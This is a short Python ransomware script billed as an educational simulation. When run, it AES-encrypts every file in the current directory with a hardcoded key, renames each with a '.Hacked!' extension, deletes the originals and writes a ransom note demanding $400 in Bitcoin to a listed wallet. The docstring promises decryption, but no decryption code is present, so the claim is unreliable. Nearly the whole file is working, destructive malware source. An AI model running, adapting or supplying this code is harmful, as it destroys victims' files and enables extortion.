"""
Simple script to simulate the procedure of a Ransomware attack
The script encrypts and decrypts target files'
"""""
"""
    This script is for educational purposes only, I do not claim responsability for any damages that the script could cause.
"""

_author_ = "Victor Marquez"
_version_ =0.4

import os
from pathlib import Path
from Crypto.Cipher import AES


def detectFiles(mainPath):
    for entry in os.scandir(mainPath):
        if entry.is_file():
            yield entry


def encryptFile(file, Pkey,Path):
    #Read file
    dataFIle = file
    with open(dataFIle, 'rb') as f:
        data = f.read()

    #Convert data to byte
    dataByte = bytes(data)


    #Encrypt the data with the key
    cipher = AES.new(Pkey, AES.MODE_EAX)
    chiphertext, tag = cipher.encrypt_and_digest(dataByte)

    #Save data
    fileName = file.name.removesuffix(file.suffix)
    fileExtension = ".Hacked!"
    encFile = Path+"/"+fileName + fileExtension
    with open(encFile, 'wb') as f:
        [f.write(x) for x in (cipher.nonce,tag,chiphertext)]
        f.close()
        os.remove(file)

#WARNING! DO NOT RUN ON MAIN PC
#This will encrypt all the files in the current working directory
path = os.getcwd()

for file in detectFiles(path):
    filePath = Path(file)
    if filePath.name =="DO NOT OPEN.exe":
        print()
    else:
        encryptFile(filePath,b'KqhHot6KyYoImzC4',path)

#Creating Ransomware README file
Message = "All of your files have been encrypted! Pay $400 worth of BTC to: bc1qtsm6vder2asdegnuck8733m4u2nhm3pe6c758j"
messageF = path + "/README.txt"
with open(messageF,'w') as f:
    f.write(Message)
    f.close()
